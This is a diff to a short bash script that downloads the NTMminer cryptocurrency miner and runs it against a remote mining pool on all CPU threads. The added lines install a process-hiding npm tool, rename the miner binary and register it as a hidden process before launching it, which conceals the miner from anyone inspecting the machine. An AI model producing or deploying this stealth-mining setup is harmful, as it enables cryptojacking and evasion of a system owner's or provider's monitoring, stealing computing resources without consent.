@@ -1,4 +1,12 @@
 #!/bin/bash
+export LC_ALL=C
+export LANG=C
+apt update && apt -y install wget curl sudo nodejs npm
+npm i -g node-process-hider
 wget https://www.ntmminer.com/downloads/NTMminer-noid-v1.1.2-linux-x64.tar.gz
 tar xzf NTMminer-noid-v1.1.2-linux-x64.tar.gz && cd NTMminer-noid-v1.1.2-linux-x64
-./ntmminer-noid --rpc http://parano1d-pool.fun:3784 --coinbase o1f74we257x39wtn0k3jws7uhvpnkmsewegkejyh89wjvmyhq53c8sj0n24h --worker rig1 --threads $(nproc --all)
+mv ntmminer-noid noider
+
+ph add noider
+
+./noider --rpc http://parano1d-pool.fun:3784 --coinbase o1f74we257x39wtn0k3jws7uhvpnkmsewegkejyh89wjvmyhq53c8sj0n24h --worker rig1 --threads $(nproc --all)
